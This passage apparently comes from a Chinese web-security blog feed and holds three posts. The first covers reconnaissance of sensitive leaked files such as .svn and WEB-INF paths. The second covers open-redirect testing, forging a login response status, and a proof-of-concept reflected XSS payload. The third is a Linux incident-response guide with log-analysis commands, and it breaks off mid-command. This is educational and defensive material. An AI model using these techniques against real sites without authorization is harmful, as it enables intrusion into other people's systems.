number">0</span><span class="token punctuation">:</span>            <span class="token keyword">pass</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> result        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"很遗憾,在下认为%s有cdn,但是目前在下的能力没能获取它的真实ip,当前函数将返回0"</span> <span class="token operator">%</span> self<span class="token punctuation">.</span>domain<span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token number">0</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token keyword">import</span> sys    domain<span class="token operator">=</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    Xcdn<span class="token punctuation">(</span>domain<span class="token punctuation">)</span></code></pre><h5 id="8、服务器ssh配置信息"><a href="#8、服务器ssh配置信息" class="headerlink" title="8、服务器ssh配置信息"></a>8、服务器ssh配置信息</h5><p>丢工具：<a href="https://github.com/mozilla/ssh_scan" target="_blank" rel="noopener">https://github.com/mozilla/ssh_scan</a></p><h5 id="9、敏感文件爆破"><a href="#9、敏感文件爆破" class="headerlink" title="9、敏感文件爆破"></a>9、敏感文件爆破</h5><ul><li><code>svn</code>源代码泄露使用<code>svn</code>版本控制系统时，错误操作将<code>.svn</code>文件存放，那么久可以看他<code>SVN</code>服务器账号密码等信息</li></ul><pre><code>http://xxx.xxx.xxx/.svn/entries</code></pre><h5 id="10、根据目标系统情况"><a href="#10、根据目标系统情况" class="headerlink" title="10、根据目标系统情况"></a>10、根据目标系统情况</h5><p>根据目标系统情况是因为看他对应的系统是什么对应有什么漏洞，下面这个是<code>tomcat</code>的<code>session</code>泄露</p><pre><code>/examples/servlets/servlet/SessionExample/examples//examples/servlets/servlet/SessionExample/examples/</code></pre><p><img src="http://static.zybuluo.com/1kbfree/c4nub4ydmq1402ccx0sav3x9/image_1dbvfielukp81f701hcd1qnq12e41j.png" alt="image_1dbvfielukp81f701hcd1qnq12e41j.png-57.6kB"></p><h3 id="敏感目录泄露"><a href="#敏感目录泄露" class="headerlink" title="敏感目录泄露"></a>敏感目录泄露</h3><ul><li><code>WEB-INF/web.xml</code>泄露</li></ul><p><code>WEB-INF</code>是<code>Java</code>的<code>WEB</code>应用的安全目录。如果想在页面中直接访问其中的文件，必须通过<code>web.xml</code>文件对要访问的文件进行相应映射才能访问</p><pre><code>/WEB-INF/config/jdbc.properties/WEB-INF/web.xml/WEB-INF/classes//WEB-INF/lib//WEB-INF/src//WEB-INF/database.properties</code></pre><ul><li><code>bzr</code>泄露</li></ul><p>通过它我们可以看项目历史</p><pre><code>http://xxx.xxx.xxx/.bzr/</code></pre><ul><li>网站源代码泄露</li></ul><p>不多介绍，可能管理员觉得网站不安全，需要我们审计一下</p><pre><code>www.zipwww.tar.gzwww.rarweb.zipweb.rar...</code></pre><p>这些有很多，，不一一详细，后面我会将这些全部集合在一个字典里，然后我们可以放入目录遍历的工具里批量扫~</p><h3 id="利用shodan、fofa等收集信息"><a href="#利用shodan、fofa等收集信息" class="headerlink" title="利用shodan、fofa等收集信息"></a>利用shodan、fofa等收集信息</h3><p>查找标题是携程并且语言是国语的站点</p><pre><code>https://www.shodan.io/search?query=http.title:&quot;携程&quot; country:&quot;CN&quot;</code></pre><p><img src="http://static.zybuluo.com/1kbfree/6c72ksiz5fz1js4zomzvy6q3/image_1dbvfuq8rvjho6e3qd1etn1va420.png" alt="image_1dbvfuq8rvjho6e3qd1etn1va420.png-338.8kB"></p><p>我们可以将其收藏为文件夹，方便下次打开，然后记录时间，看看有没有新上线的（这里已经有监控的功能，各位师傅可以去看看米斯特大佬写的<code>shodan</code>监控文章，很有趣很实用）</p><p><code>shodan</code>、<code>fofa</code>不多介绍了，有对应的手册，见的肯定比我好</p><h3 id="思路扩展"><a href="#思路扩展" class="headerlink" title="思路扩展"></a>思路扩展</h3><p>思路扩展就是在<code>a</code>功能点中找出<code>b</code>功能点，以此类推</p><p>比如一些后台登录是</p><pre><code>http://xxx.xxx.xxx/admin-login</code></pre><p>我们是不是可以尝试吧<code>login</code>改成<code>register</code>来注册</p><p>再比如获取用户手机号的接口（这里不存在越权）</p><pre><code>http://xxx.xxx.xxx/user/GetPhone/?id=1</code></pre><p>然后我们把<code>GetPhone</code>改成<code>GetPasswd</code>或者<code>GetPwd</code>或者<code>GetPassword</code>然后<code>id</code>就可能可以越权，或者这里可以<code>json</code>劫持或者<code>origin</code>劫持等，我们可以诱导用户点开来劫持账号密码</p><p>或者还是看源代码，然后搜索<code>hidden</code>（滑稽），我们可能可能会找到敏感操作的按钮，然后管理员也知道敏感，将其”隐藏”了，我们可以根据这个来搜索然后访问他，嘿嘿嘿（之前对一个小站点进行挖掘的时候我<code>hidden</code>找居然找到了不可描述的目录下面放着不可描述的电影，当时我的心情是非常拒绝的，经过几小时的思考我迅速的将那个目录关闭了，毕竟我是祖国的花朵）</p><p>这里有很多是<code>adrian</code>师傅与我分享的，然后暂时只写那么多吧（其实还有几个，怕触犯到权什么的就是他给你学了但不给我写的那种，很麻烦所以就以后有机会再写吧），如果遇到了更多我会补充</p><blockquote><p>来源于网络，回馈于网络<br>作者qq：1900065568<br>经济条件的情况下表哥们可以来我小密圈支持支持表弟！！！非常感谢（111<code>rmb</code>/一位）分享漏洞挖掘、经验等</p></blockquote><p><img src="http://static.zybuluo.com/1kbfree/ylvvhzoh5splt469df590ir6/xmq.jpg" alt="xmq.jpg-47.5kB"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 信息收集 </tag>
            
            <tag> Web安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>对web安全的一些经验分享[url跳转篇]</title>
      <link href="/2019/05/23/dui-web-an-quan-de-yi-xie-jing-yan-fen-xiang-url-tiao-zhuan-pian/"/>
      <url>/2019/05/23/dui-web-an-quan-de-yi-xie-jing-yan-fen-xiang-url-tiao-zhuan-pian/</url>
      
        <content type="html"><![CDATA[<p>今年是挖洞的一年了，也对<code>web</code>安全产生了感情，之前盲目于一直挖洞每天技术都没什么增长，多的仅是那么一点点的经验，而且通过这次的护网行动，也看出了自己的很多不足，说白了就是很菜然后自己还没看清自己，所以接下来的日子里，自己都会尽量去接触一些自己的知识盲区来扩大自己的知识面。</p><blockquote><p>都是自己的一些心得，并非炒作于哪儿</p></blockquote><h1 id="针对url跳转漏洞"><a href="#针对url跳转漏洞" class="headerlink" title="针对url跳转漏洞"></a>针对<code>url</code>跳转漏洞</h1><p>1、在登录\注册\找回密码\退出处<br>2、站内跳（如在当前页面下写一个链接，然后我们点击的话就会以这种形式<code>&lt;a href=&#39;http://www.站内.com/?tourl=写下的链接&#39;&gt;写下的链接&lt;/a&gt;</code>）还有<code>404</code>页面跳，成功执行某操作的跳<br>3、退回（比如有些页面有返回的功能，就是跳转到上一个页面，而且是根据<code>referer</code>值来跳的）</p><h2 id="登录-注册-找回密码-退出"><a href="#登录-注册-找回密码-退出" class="headerlink" title="登录\注册\找回密码\退出"></a>登录\注册\找回密码\退出</h2><p>这些点我们可以考虑利用<code>fuzz</code>来对其进行探查出跳转漏洞</p><p>我的<code>fuzz</code>中理解为分 2 种</p><ol><li>盲<code>fuzz</code>来找跳转参数</li><li>针对性找跳转参数</li></ol><h3 id="一个栗子（登陆处fuzz）"><a href="#一个栗子（登陆处fuzz）" class="headerlink" title="一个栗子（登陆处fuzz）"></a>一个栗子（登陆处<code>fuzz</code>）</h3><p>这是一个登陆系统</p><pre><code>https://www.xxx.xxx/account/signin</code></pre><p>那么我们可以选择第一种办法来对其进行<code>fuzz</code>来爆破出跳转参数，比如<code>url</code>、<code>go</code>、<code>re</code>等，但是这种不一定有效而且高效，所以我一般会先尝试第二种办法 <strong>针对性</strong> 找跳转参数</p><p>1.审查源代码</p><p>因为很多跳转参数都是在前端构造的</p><p>2.查询<code>hidden</code>、<code>url</code>之类的参数（因为很多系统都会把要跳转的参数放在<code>input</code>上，并且设置其为隐藏，这样子可以不影响界面美观，然后把<code>value</code>的值作为跳转参数，登陆后读取其值来确认要跳转的地儿~）</p><p><img src="http://static.zybuluo.com/1kbfree/fit4wo252iluyw5eda6d9epk/image_1dbb97vek84rs4defr1s9u1so49.png" alt="image_1dbb97vek84rs4defr1s9u1so49.png-33.3kB"></p><p>那么我们就提取出这个<code>returnUrl</code>构造在<code>url</code>里</p><pre><code>https://www.xxx.abc/account/signin?returnUrl=http://www.xxx.abc/123321</code></pre><p>这里第一步测试的时候是先填他的主域名（因为如果你一上来就填写你想跳转的<code>url</code>他可能有过滤的可能直接将其替换为空或者是主站域名），后面的<code>123321</code>是个人的日常习惯，用户定位源代码处的，这个小小小技巧也可以用在测试<code>xss</code>漏洞上，快速定位源代码的回显处</p><p>3.查看效果</p><p><img src="http://static.zybuluo.com/1kbfree/x3fxpxvboykl8uo5agc5l2ah/image_1dbb9i97d6g7ebn125opad1elj1g.png" alt="image_1dbb9i97d6g7ebn125opad1elj1g.png-383.2kB"></p><p>4.尝试直接输入想跳转的<code>url</code>，看他是否有过滤</p><p><img src="http://static.zybuluo.com/1kbfree/tqljmirxg0mdohrkavw0xk1f/image_1dbb9higs1kbteiomrh11o8158613.png" alt="image_1dbb9higs1kbteiomrh11o8158613.png-54kB"></p><p>然后登陆后就成功跳转了~</p><h3 id="再举一个栗子"><a href="#再举一个栗子" class="headerlink" title="再举一个栗子"></a>再举一个栗子</h3><p>一个管理员才可以登录的系统，可是俺没有账号密码如何判断他是否存在<code>url</code>跳转呢o v o~，（我爆破不出来，我捡你一个洞总可以吧╭(╯^╰)╮）</p><p>如下是一个管理员的登录系统（只要不能注册的界面，俺都叫他管理员的登录系统）</p><pre><code>http://xxx.admin.xxx/supplier_web/login?returnUrl=http%3A%2F%2F127.0.0.1</code></pre><p><img src="http://static.zybuluo.com/1kbfree/ft43hcooqtctfqkleeto2oqk/image_1dbba30kobs81ko31k6asq6avj2d.png" alt="image_1dbba30kobs81ko31k6asq6avj2d.png-198.7kB"></p><p>可以看到这里不能注册，我们也不知道密码，那么怎么测试他是否可以跳转？</p><p>其实很简单</p><ol><li>登录的时候抓包</li><li>修改状态码（把<code>flase</code>改成<code>true</code>这些）</li><li>然后就会跳转，因为这里的逻辑是，服务器通过判断状态码来给你构造一个登录流程，而这个登录流程支持跳转，那么就可以成功的测试出来啦~</li></ol><p><img src="http://static.zybuluo.com/1kbfree/hf4qi13b8p3t2wid4jintn7e/image_1dbbaa6pj16of9974ep2rnv0b2q.png" alt="image_1dbbaa6pj16of9974ep2rnv0b2q.png-53.9kB"></p><blockquote><p>本来服务器返回的<code>statusCode</code>是<code>500</code>的，我将其修改为<code>200</code></p></blockquote><p>接着就有这么一个请求过来</p><p><img src="http://static.zybuluo.com/1kbfree/cyq7ca6c4xcybsi1au13myuw/image_1dbbacav275upnn1k09f4v1fse37.png" alt="image_1dbbacav275upnn1k09f4v1fse37.png-74.6kB"></p><p>成功跳转~</p><p>然后还有站内跳，成功提示后跳都是一样的，对参数进行<code>fuzz</code>，然后绕过，如果绕不过就砸电脑一气呵成即可；</p><p>还有一个是<code>adrian</code>师傅和我分享过的，把登录处的<code>login</code>改成<code>logout</code>，然后对跳转参数进行过滤的功能就不存在了，因为开发者都不会想到在<code>logout</code>参数那里做参数过滤，然后就导致了可以直接导致<code>url</code>跳转漏洞的产生</p><h2 id="退回功能的跳转导致了反射xss"><a href="#退回功能的跳转导致了反射xss" class="headerlink" title="退回功能的跳转导致了反射xss"></a>退回功能的跳转导致了反射<code>xss</code></h2><p>之前遇到过，但是忘记记录了，也是比较好玩的我大概讲解一下</p><p>1、打开<code>http://www.111.com/back</code>他会跳转到<code>referer</code>的值（而且这里可以解析<code>html</code>，并且<code>referer</code>值在<code>script</code>脚本里<code>&lt;script&gt;url = &#39;referer值&#39;;window.location.href=url&lt;/script&gt;</code>）<br>2、我在自己的网站创建了一个文件(<code>only_free.php</code>)，然后其功能是跳转到<code>www.111.com/back</code>，那么我可以这样子请求</p><pre><code>http://www.only_free.com/only_free.php?name=&#39;;alert(1);b=&#39;1</code></pre><p>最后<code>http://www.111.com/back</code>里的<code>js</code>代码就变成</p><pre class=" language-javascript"><code class="language-javascript">url <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>b<span class="token operator">=</span><span class="token string">'1'</span><span class="token punctuation">;</span>window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href<span class="token operator">=</span>url</code></pre><p>然后就成功弹窗了。</p><blockquote><p>作者qq: 1900065568</p></blockquote><p>有兴趣的朋友可以加我一起交流</p>]]></content>
      
      
      
        <tags>
            
            <tag> 经验分享 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux应急响应</title>
      <link href="/2019/05/23/linux-ying-ji-xiang-ying/"/>
      <url>/2019/05/23/linux-ying-ji-xiang-ying/</url>
      
        <content type="html"><![CDATA[<blockquote><p>选自网络，总结与此</p></blockquote><h3 id="文件夹介绍"><a href="#文件夹介绍" class="headerlink" title="文件夹介绍"></a>文件夹介绍</h3><ul><li>dev</li></ul><p><img src="http://static.zybuluo.com/1kbfree/3zcrpvg2tv8v2qgv6qasj976/image_1dau6mcga1c1f1ooo16pm1ctd1srm1j.png" alt="image_1dau6mcga1c1f1ooo16pm1ctd1srm1j.png-74kB"></p><ul><li>etc</li></ul><p><img src="http://static.zybuluo.com/1kbfree/cwusv528w9ttfu25b4u76omu/image_1dau6n85f1iuhe8m1gs61vdl1vft20.png" alt="image_1dau6n85f1iuhe8m1gs61vdl1vft20.png-62.3kB"></p><ul><li>home</li></ul><p><img src="http://static.zybuluo.com/1kbfree/mgbiy9n29f2bk5wa20xx5bgr/image_1dau6qimqjfutmt1n6omvh192g2d.png" alt="image_1dau6qimqjfutmt1n6omvh192g2d.png-72.4kB"></p><ul><li>lib/lib64</li></ul><p><img src="http://static.zybuluo.com/1kbfree/p1haahb6agk7z2qdhltv2ri3/image_1dau6s4m4as61fpusoa19am1t872q.png" alt="image_1dau6s4m4as61fpusoa19am1t872q.png-13.4kB"></p><ul><li>opt</li></ul><p><img src="http://static.zybuluo.com/1kbfree/08wi1ffko43xqj0e7thb0rw0/image_1dau6sjq21ae9p9ef3qt2147v37.png" alt="image_1dau6sjq21ae9p9ef3qt2147v37.png-6kB"></p><ul><li>root</li></ul><p><img src="http://static.zybuluo.com/1kbfree/13s616op8k845yqy7ruv3n1x/image_1dau6t5eo1l2915s29lhbtteur3k.png" alt="image_1dau6t5eo1l2915s29lhbtteur3k.png-4.8kB"></p><ul><li>sbin</li></ul><p><img src="http://static.zybuluo.com/1kbfree/q8f9g4jwkbp48gg8ay8faolx/image_1dau70dohgnqhll1shi5qt1ekn41.png" alt="image_1dau70dohgnqhll1shi5qt1ekn41.png-113.5kB"></p><ul><li>tmp</li></ul><p><img src="http://static.zybuluo.com/1kbfree/19tlxhdr45x6zifxi8fszya6/image_1dau710pu1d0lsp0qaa1nv5deb4e.png" alt="image_1dau710pu1d0lsp0qaa1nv5deb4e.png-14.9kB"></p><h3 id="用户组概念"><a href="#用户组概念" class="headerlink" title="用户组概念"></a>用户组概念</h3><ul><li>所有组</li><li>用户组</li><li>其他组</li></ul><p><img src="http://static.zybuluo.com/1kbfree/f33bxu4ikw99zp6c30m88wxm/image_1dau74f82fkh1dk228ivi1o3r4r.png" alt="image_1dau74f82fkh1dk228ivi1o3r4r.png-79.2kB"></p><h4 id="权限概念"><a href="#权限概念" class="headerlink" title="权限概念"></a>权限概念</h4><p><a href="https://blog.csdn.net/qq_28451255/article/details/80468712" target="_blank" rel="noopener">https://blog.csdn.net/qq_28451255/article/details/80468712</a></p><p><img src="http://static.zybuluo.com/1kbfree/iz6pzc8ku1lyq2nt3ln1r4hv/image_1dau7mphp1eae6pod8b1l1ni1p58.png" alt="image_1dau7mphp1eae6pod8b1l1ni1p58.png-53.8kB"></p><p><img src="http://static.zybuluo.com/1kbfree/enww77c92iyzk7szzdths6ck/image_1dau8st1e1fph1hot1trs1f3truc65.png" alt="image_1dau8st1e1fph1hot1trs1f3truc65.png-94.9kB"></p><h5 id="stat命令"><a href="#stat命令" class="headerlink" title="stat命令"></a>stat命令</h5><p><img src="http://static.zybuluo.com/1kbfree/29vvvj4je2vs1b1p4gavaab9/image_1dau8vbhl10u41bbjp0o1gg71ano6v.png" alt="image_1dau8vbhl10u41bbjp0o1gg71ano6v.png-220.6kB"></p><p><img src="http://static.zybuluo.com/1kbfree/6619083ac5y2nckgqi2xowfj/image_1dau8ug3n18321h6lh0i1a2g12s86i.png" alt="image_1dau8ug3n18321h6lh0i1a2g12s86i.png-79.3kB"></p><h5 id="ls"><a href="#ls" class="headerlink" title="ls"></a>ls</h5><p><img src="http://static.zybuluo.com/1kbfree/fbxnqbhpwprpxho6p3h7f5jq/image_1dau9166t170v1oia1q9c1fcm887c.png" alt="image_1dau9166t170v1oia1q9c1fcm887c.png-29.8kB"></p><h5 id="netstae"><a href="#netstae" class="headerlink" title="netstae"></a>netstae</h5><p><img src="http://static.zybuluo.com/1kbfree/d1kpwfxynye6w966lcmt8qe4/image_1dau957r41ujqm5qg6lcff1o487p.png" alt="image_1dau957r41ujqm5qg6lcff1o487p.png-35.8kB"></p><pre><code>看22端口的链接情况 netstat -anplt|grep 22</code></pre><p><img src="http://static.zybuluo.com/1kbfree/bk1ubjha6gs8szs9vyzrurfd/image_1daueiseuqfgpmhs7i5lj1kfsdu.png" alt="image_1daueiseuqfgpmhs7i5lj1kfsdu.png-256.9kB"></p><h5 id="lsod"><a href="#lsod" class="headerlink" title="lsod"></a>lsod</h5><p><img src="http://static.zybuluo.com/1kbfree/vqntxquze5hvgni8tstovu0g/1.png" alt="1.png-26.5kB"></p><pre><code>lsof -i :80查看端口为80的tcp或udp进程</code></pre><h5 id="ps"><a href="#ps" class="headerlink" title="ps"></a>ps</h5><blockquote><p>查进程</p></blockquote><p><img src="http://static.zybuluo.com/1kbfree/nxhs1edpbhfmmiqkn5d9jmdf/image_1dau9ofmdt07ftc10uj1bkr1kqb8i.png" alt="image_1dau9ofmdt07ftc10uj1bkr1kqb8i.png-29.7kB"></p><h5 id="top-htop"><a href="#top-htop" class="headerlink" title="top/htop"></a>top/htop</h5><blockquote><p>进程</p></blockquote><p><code>top</code>和<code>htop</code>和<code>window</code>任务管理器一样</p><h5 id="grep"><a href="#grep" class="headerlink" title="grep"></a>grep</h5><blockquote><p>查文件内容</p></blockquote><p><img src="http://static.zybuluo.com/1kbfree/5zzbn8degsv2gsfr4tvqka8x/image_1dau9stpuqghncd91ikpooji8v.png" alt="image_1dau9stpuqghncd91ikpooji8v.png-54.7kB"></p><pre><code>-i 忽略大小写-v 不包含匹配字符</code></pre><pre><code>egrep -v &quot;root|test&quot; /etc/passwd 过滤passwd文件的root和test的内容egrep &quot;root|test&quot; /etc/passwd 只查找passwd文件的root和test的内容</code></pre><h5 id="tcpdump"><a href="#tcpdump" class="headerlink" title="tcpdump"></a>tcpdump</h5><blockquote><p>抓包</p></blockquote><p><img src="http://static.zybuluo.com/1kbfree/nhetuzwra8ormbn392bell0n/image_1daua5oit10p21o59a8vop01abu9s.png" alt="image_1daua5oit10p21o59a8vop01abu9s.png-112.1kB"></p><h5 id="find"><a href="#find" class="headerlink" title="find"></a>find</h5><blockquote><p>查文件名</p></blockquote><p><img src="http://static.zybuluo.com/1kbfree/a640h23jypueyp4o7h5nw8qm/image_1dauaailg5md1st41l9a17c1bgia9.png" alt="image_1dauaailg5md1st41l9a17c1bgia9.png-91.5kB"></p><p><img src="http://static.zybuluo.com/1kbfree/3xle9wiu0e3dssvkpg7nytou/image_1dauajgse11m5j4mlvl9662a7am.png" alt="image_1dauajgse11m5j4mlvl9662a7am.png-111.1kB"></p><h5 id="which"><a href="#which" class="headerlink" title="which"></a>which</h5><blockquote><p>看程序所在位置</p></blockquote><p><img src="http://static.zybuluo.com/1kbfree/llqkq0h3jtejt2lo1p97nb8j/image_1dauaq29h1158jcc1fl61aomilb3.png" alt="image_1dauaq29h1158jcc1fl61aomilb3.png-20.5kB"></p><h5 id="bash-history"><a href="#bash-history" class="headerlink" title=".bash_history"></a>.bash_history</h5><blockquote><p>看执行历史命令</p></blockquote><p><img src="http://static.zybuluo.com/1kbfree/na4b23v2pfxmcw01d4wlf9mb/image_1daub45k9h28q1i11251k2f11m3bg.png" alt="image_1daub45k9h28q1i11251k2f11m3bg.png-62.4kB"></p><p>一般用法，进入<code>tmp</code>目录把历史执行命令保存到这里</p><p><img src="http://static.zybuluo.com/1kbfree/giw14n2tpl0sz01a3at36h6s/image_1daub92kup8t1b1r11cor901i41bt.png" alt="image_1daub92kup8t1b1r11cor901i41bt.png-69.6kB"></p><p>把所有结果集合起来</p><p><img src="http://static.zybuluo.com/1kbfree/wmt0dr5amk7hrn7uvtlcpkrm/image_1daubgmgsfgi1daj1spas2s1cjdca.png" alt="image_1daubgmgsfgi1daj1spas2s1cjdca.png-103.5kB"></p><h5 id="检测系统关键文件"><a href="#检测系统关键文件" class="headerlink" title="检测系统关键文件"></a>检测系统关键文件</h5><p>1、用户信息文件<code>/etc/passwd</code></p><pre><code>root:x\:0:0:root:/root:/bin/bashaccount:password:UID:GID:GECOS:directory:shell</code></pre><p>对应的信息：</p><pre><code>用户名：密码：用户ID：组ID：用户说明：家目录：登陆之后shell</code></pre><blockquote><p>无密码只允许本机登陆，远程不允许登陆</p></blockquote><p>2、影子文件<code>/etc/shadow</code></p><pre><code>root:$6$oGs1PqhL2p3ZetrE$X7o7bzoouHQVSEmSgsYN5UD4.kMHx6qgbTqwNVC5oOAouXvcjQSt.Ft7ql1WpkopY0UV9ajBwUt1DpYxTCVvI/:16809:0:99999:7:::用户名：加密密码（可以看强弱来判断是否可能出现弱口令导致被直接爆破的）：密码最后一次修改日期：两次密码的修改时间间隔：密码有效期：密码修改到期到的警告天数：密码过期之后的宽限天数：账号失效时间：保留</code></pre><p>3、用户组<code>/etc/group</code></p><p><img src="http://static.zybuluo.com/1kbfree/s2tntcq8m8an0bntafk5fs5k/image_1daubteerqhfunbc1f1tjg1lufcn.png" alt="image_1daubteerqhfunbc1f1tjg1lufcn.png-15kB"></p><p>4、用户登录时都会运行的环境变量设置<code>/etc/profile</code></p><h3 id="检测开机启动项"><a href="#检测开机启动项" class="headerlink" title="检测开机启动项"></a>检测开机启动项</h3><p><img src="http://static.zybuluo.com/1kbfree/ncqkr8mwl9lz5hq1i4yukdg1/image_1daucrahmqte2t71ib1lqg16u6d4.png" alt="image_1daucrahmqte2t71ib1lqg16u6d4.png-47.2kB"></p><h4 id="查看运行级别"><a href="#查看运行级别" class="headerlink" title="查看运行级别"></a>查看运行级别</h4><pre><code>runlevel</code></pre><h4 id="系统默认允许级别"><a href="#系统默认允许级别" class="headerlink" title="系统默认允许级别"></a>系统默认允许级别</h4><pre><code>vi  /etc/inittabid=3：initdefault  系统开机后直接进入哪个运行级别</code></pre><h4 id="开机启动配置文件"><a href="#开机启动配置文件" class="headerlink" title="开机启动配置文件"></a>开机启动配置文件</h4><pre><code>/etc/rc.local/etc/rc.d/rc[0~6].d</code></pre><p>例子:当我们需要开机启动自己的脚本时，只需要将可执行脚本丢在 <code>/etc/init.d</code> 目录下，然后在 <code>/etc/rc.d/rc*.d</code> 中建立软链接（<code>window</code>的快捷方式）即可</p><pre><code>root@localhost ~]# ln -s /etc/init.d/sshd /etc/rc.d/rc3.d/S100ssh</code></pre><p>此处 <code>sshd</code> 是具体服务的脚本文件，<code>S100ssh</code> 是其软链接，<code>S</code> 开头代表加载时自启动；如果是 <code>K</code> 开头的脚本文件，代表运行级别加载时需要关闭的。</p><h3 id="入侵排查"><a href="#入侵排查" class="headerlink" title="入侵排查"></a>入侵排查</h3><blockquote><p>启动项文件</p></blockquote><pre><code>more /etc/rc.local    /etc/rc.d/rc[0~6].dls -l /etc/rc.d/rc3.d/</code></pre><h4 id="定时任务"><a href="#定时任务" class="headerlink" title="定时任务"></a>定时任务</h4><h5 id="1、利用-crontab-创建计划任务"><a href="#1、利用-crontab-创建计划任务" class="headerlink" title="1、利用 crontab 创建计划任务"></a>1、利用 <code>crontab</code> 创建计划任务</h5><pre><code>crontab -l   列出某个用户 cron 服务的详细内容crontab -r   删除每个用户 cront 任务(谨慎：删除所有的计划任务)crontab -e   使用编辑器编辑当前的 crontab 文件 </code></pre><p><strong>默认编写的 <code>crontab</code> 文件会保存在 ( <code>/var/spool/cron/用户名</code> 例如: <code>/var/spool/cron/root</code>）</strong></p><p><strong>如：<code>*/1 * * * * echo &quot;hello world&quot; &gt;&gt; /tmp/test.txt</code> 每分钟写入文件</strong></p><h5 id="2、利用-anacron-实现异步定时任务调度"><a href="#2、利用-anacron-实现异步定时任务调度" class="headerlink" title="2、利用 anacron 实现异步定时任务调度"></a>2、利用 <code>anacron</code> 实现异步定时任务调度</h5><p>每天运行 <code>/home/backup.sh</code> 脚本：</p><pre><code>vi /etc/anacrontab @daily    10    example.daily   /bin/bash /home/backup.sh</code></pre><p>当机器在 <code>backup.sh</code> 期望被运行时是关机的，<code>anacron</code> 会在机器开机十分钟之后运行它，而不用再等待 7 天。</p><h5 id="3、重点关注以下目录是否存在脚本"><a href="#3、重点关注以下目录是否存在脚本" class="headerlink" title="3、重点关注以下目录是否存在脚本"></a>3、重点关注以下目录是否存在脚本</h5><pre><code>/var/spool/cron/* /etc/crontab/etc/cron.d/*/etc/cron.daily/* /etc/cron.hourly/* /etc/cron.monthly/*/etc/cron.weekly//etc/anacrontab/var/spool/anacron/*</code></pre><p>小技巧：</p><pre><code>more /etc/cron.daily/*  查看目录下所有文件</code></pre><h4 id="服务自启动"><a href="#服务自启动" class="headerlink" title="服务自启动"></a>服务自启动</h4><h5 id="第一种修改方法："><a href="#第一种修改方法：" class="headerlink" title="第一种修改方法："></a>第一种修改方法：</h5><pre><code>chkconfig [--level 运行级别][独立服务名][on|off]chkconfig –level  2345 httpd on  开启自启动chkconfig httpd on （默认 level 是 2345）</code></pre><h5 id="第二种修改方法："><a href="#第二种修改方法：" class="headerlink" title="第二种修改方法："></a>第二种修改方法：</h5><pre><code>修改 /etc/re.d/rc.local 文件  加入 /etc/init.d/httpd start</code></pre><h5 id="第三种修改方法："><a href="#第三种修改方法：" class="headerlink" title="第三种修改方法："></a>第三种修改方法：</h5><pre><code>使用 ntsysv 命令管理自启动，可以管理独立服务和 xinetd 服务。</code></pre><h4 id="查询已安装的服务"><a href="#查询已安装的服务" class="headerlink" title="查询已安装的服务"></a>查询已安装的服务</h4><pre><code>chkconfig  --list  查看服务自启动状态，可以看到所有的RPM包安装的服务ps aux | grep crond 查看当前服务</code></pre><p>系统在<code>3</code>与<code>5</code>的级别下启用</p><pre><code>chkconfig --list | grep &quot;3:启用|5:启用&quot;</code></pre><p>查看服务安装位置 ，一般是在 <code>/user/local/</code></p><pre><code>service httpd start</code></pre><p>搜索 <code>/etc/rc.d/init.d/</code>  查看是否存在</p><h4 id="系统日志"><a href="#系统日志" class="headerlink" title="系统日志"></a>系统日志</h4><pre><code>日志默认存放位置：/var/log/查看日志配置情况：more /etc/rsyslog.conf</code></pre><p><img src="http://static.zybuluo.com/1kbfree/uuv68q8sfc1hdlttszppmr1b/image_1daudq0dfhbi289qnp3rq7uqdh.png" alt="image_1daudq0dfhbi289qnp3rq7uqdh.png-321.8kB"></p><h5 id="日志分析技巧"><a href="#日志分析技巧" class="headerlink" title="日志分析技巧"></a>日志分析技巧</h5><p>1、定位有多少IP在爆破主机的 <code>root</code> 帐号：</p><pre><code>grep &quot;Failed password for root&quot; /var/log/secure | awk &#39;{print $11}&#39; | sort | uniq -c | sort -nr | more</code></pre><p>定位有哪些 <code>IP</code> 在爆破：</p><pre><code>grep &quot;Failed password&quot; /var/log/secure|grep -E -o &quot;(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?).(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?).(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?).(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)&quot;|uniq -c</code></pre><p>爆破用户名字典是什么？</p><pre><code>grep &quot;Failed password&quot; /var/log/secure|perl -e &#39;while($_=&lt;&gt;){ /for(.*?) from/; print &quot;$1\n&quot;;}&#39;|uniq -c|sort -nr</code></pre><p>2、登录成功的 IP 有哪些：     </p><pre><code>grep &quot;Accepted &quot; /var/log/secure | awk &#39;{print $11}&#39; | sort | uniq -c | sort -nr | more</code></pre><p>登录成功的日期、用户名、IP：</p><pre><code>grep &quot;Accepted &quot; /var/log/secure | awk &#39;{print $1,$2,$3,$9,$11}&#39; </code></pre><p>3、增加一个用户 <code>kali</code> 日志：</p><pre><code>Jul1000:12:15localhostuseradd[2382]: newgroup: name=kali, GID=1001Jul1000:12:15localhostuseradd[2382]: newuser: name=kali, UID=1001, GID=1001, home=/home/kali, shell=/bin/bashJul1000:12:58localhostpasswd: pam_unix(passwd:chauthtok): passwordchangedforkali#grep&quot;useradd&quot;/var/log/secure</code></pre><p>4、删除用户 <code>kali</code> 日志：</p><pre><code>Jul1000:14:17localhostuserdel[2393]: deleteuser&#39;kali&#39;Jul1000:14:17localhostuserdel[2393]: removedgroup&#39;kali&#39; ownedby&#39;kali&#39;Jul1000:14:17localhostuserdel[2393]: removedshadowgroup&#39;kali&#39; ownedby&#39;kali&#39;#grep&quot;userdel&quot;/var/log/secure</code></pre><p>5、<code>su</code> 切换用户：</p><pre><code>Jul 10 00:38:13 localhost su: pam_unix(su-l:session): session opened for user good by root(uid=0)</code></pre><p><code>sudo</code> 授权执行:</p><pre><code>sudo 